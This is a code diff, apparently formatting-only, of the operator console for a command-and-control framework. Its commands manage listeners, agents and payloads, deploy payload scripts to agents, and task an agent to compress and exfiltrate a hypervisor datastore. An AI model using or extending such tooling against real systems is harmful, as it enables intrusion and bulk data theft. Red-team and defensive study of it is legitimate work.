@@ -2,16 +2,18 @@ import sys
 import json
 from cmdhelp import context_help, cmd_help
 
+
 def do_help(self, cmd):
-        """
-        Offer help to the user. If the context is None, return general information.
-        If the context is active (agent,listener,payload), return all available
-        commands for that context.
-        """
-        if self.context:
-            context_help(self.context.split(" ")[0])
-        else:
-            context_help(None)
+    """
+    Offer help to the user. If the context is None, return general information.
+    If the context is active (agent,listener,payload), return all available
+    commands for that context.
+    """
+    if self.context:
+        context_help(self.context.split(" ")[0])
+    else:
+        context_help(None)
+
 
 def do_format(self, cmd):
     """
@@ -32,12 +34,14 @@ def do_format(self, cmd):
         return
     self.stdout_format = requested_format
 
+
 def do_add(self, cmd):
     """
     Method to add a new listener
     """
     _COMMAND_CONTEXTS = ["listener"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert len(cmd.split()) == 3
@@ -56,12 +60,14 @@ def do_add(self, cmd):
         return
     self.add_listener(host, port, secret)
 
+
 def do_remove(self, cmd):
     """
     Method to remove an active listener
     """
     _COMMAND_CONTEXTS = ["listener"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert len(cmd.split()) == 1
@@ -72,12 +78,14 @@ def do_remove(self, cmd):
     listener_uuid = cmd[0]
     self.remove_listener(listener_uuid)
 
+
 def do_list(self, cmd):
     """
     Method to list agents, listeners, and payloads
     """
     _COMMAND_CONTEXTS = ["listener", "payload", "agent"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     if self.context == "listener":
         self.list_listener()
@@ -86,11 +94,13 @@ def do_list(self, cmd):
     if self.context == "agent":
         self.list_agent()
 
+
 def do_ls(self, cmd):
     """
     Alias for the list command
     """
     self.do_list(cmd)
+
 
 def do_interact(self, cmd):
     """
@@ -98,7 +108,8 @@ def do_interact(self, cmd):
     with a connected agent
     """
     _COMMAND_CONTEXTS = ["agent"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert len(cmd.split()) == 1
@@ -118,13 +129,15 @@ def do_interact(self, cmd):
     self.agent = self.agents[uuid]
     self.update_prompt()
 
+
 def do_exfil(self, cmd):
     """
     Method to exfiltrate an enumerated datastore
     from the hypervisor
     """
     _COMMAND_CONTEXTS = ["agent"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert len(cmd.split()) == 2
@@ -148,7 +161,7 @@ def do_exfil(self, cmd):
     except AssertionError:
         print("Agent has no enumerated datastores!")
         return
-    
+
     # Check if the datastore exists on the agent
     try:
         assert datastore_uuid in selected_agent.enumdata["host_data"]["host_mounts"]
@@ -157,15 +170,15 @@ def do_exfil(self, cmd):
         return
 
     # Get the datastore mountpoint from enumdata
-    mountpoint = selected_agent.enumdata["host_data"]["host_mounts"][datastore_uuid]["mountpoint"]
+    mountpoint = selected_agent.enumdata["host_data"]["host_mounts"][datastore_uuid][
+        "mountpoint"
+    ]
     print(mountpoint)
 
     # Task the agent to compress and transfer the entire datastore
-    exfil_task = {
-        "cmd": "EXFIL_DATASTORE",
-        "mountpoint": mountpoint
-    }
+    exfil_task = {"cmd": "EXFIL_DATASTORE", "mountpoint": mountpoint}
     self.agents[agent_uuid].add_task(json.dumps(exfil_task))
+
 
 def do_get(self, cmd):
     """
@@ -173,7 +186,8 @@ def do_get(self, cmd):
     server
     """
     _COMMAND_CONTEXTS = ["agent"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert len(cmd.split()) == 2
@@ -195,12 +209,14 @@ def do_get(self, cmd):
     }
     self.agents[uuid].add_task(json.dumps(get_task))
 
+
 def do_use(self, cmd):
     """
     Method to select a payload
     """
     _COMMAND_CONTEXTS = ["payload"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert len(cmd.split()) == 1
@@ -216,13 +232,15 @@ def do_use(self, cmd):
         self.payload = None
         print("Payload not found!")
 
+
 def do_info(self, cmd):
     """
     Method to display information about a loaded payload or
     display enumerated data from an agent
     """
     _COMMAND_CONTEXTS = ["payload", "agent"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     if self.context == "payload":
         if not self.payload:
@@ -254,12 +272,14 @@ def do_info(self, cmd):
             return
         self.agent_info(self.agents[uuid])
 
+
 def do_set(self, cmd):
     """
     Method that allows the user to modify payload settings
     """
     _COMMAND_CONTEXTS = ["payload"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert self.payload is not None
@@ -290,12 +310,14 @@ def do_set(self, cmd):
     else:
         self.payload.options[option]["value"] = value
 
+
 def do_run(self, cmd):
     """
     Method to deploy a payload to a selected agent
     """
     _COMMAND_CONTEXTS = ["payload"]
-    if not self.check_context(_COMMAND_CONTEXTS): return
+    if not self.check_context(_COMMAND_CONTEXTS):
+        return
 
     try:
         assert self.payload is not None
@@ -320,11 +342,13 @@ def do_run(self, cmd):
             return
         self.agents[uuid].add_payload(script)
 
+
 def do_EOF(self, line):
     """
     Handle EOF
     """
     return True
+
 
 def do_quit(self, cmd):
     """
